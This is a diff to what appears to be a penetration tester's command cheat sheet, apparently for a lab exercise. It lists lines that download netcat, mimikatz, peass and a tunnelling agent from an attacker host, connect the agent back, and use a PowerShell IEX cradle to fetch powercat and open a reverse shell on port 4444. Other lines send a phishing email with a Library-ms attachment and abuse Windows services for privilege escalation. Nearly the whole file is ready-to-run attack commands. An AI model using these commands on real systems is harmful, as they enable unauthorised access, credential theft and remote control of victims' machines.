@@ -4,7 +4,13 @@ curl.exe http://192.168.45.156:8000/nc.exe -o nc.exe
 
 curl.exe http://192.168.45.156:8000/agent.exe -o agent.exe
 
-curl.exe http://192.168.45.206:8000/mimikatz.exe -o mimikatz.exe
+.\agent.exe -connect 192.168.45.156:443 -ignore-cert
+
+curl.exe http://192.168.45.156:8000/mimikatz.exe -o mimikatz.exe
+
+curl.exe http://192.168.45.156:8000/peass64.exe -o peass.exe
+
+curl.exe http://192.168.45.156:8000/sysinternal/Procmon64.exe -o procmon.exe
 
 certutil.exe -f -split -urlcache 192.168.45.156:8000/mimikatz.exe
 
@@ -23,3 +29,10 @@ sudo swaks -t jim@relia.com --from maildmz@relia.com --attach @config.Library-ms
 powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.156:8000/powercat.ps1');
 powercat -c 192.168.45.156 -p 4444 -e powershell"
 
+runas /user:backupadmin cmd
+
+sc.exe create "Scheduler" binpath= "C:\Tools\scheduler.exe"
+
+.\accesschk.exe /accepteula -ucqv process_name
+
+https://medium.com/r3d-buck3t/privilege-escalation-with-insecure-windows-service-permissions-5d97312db107
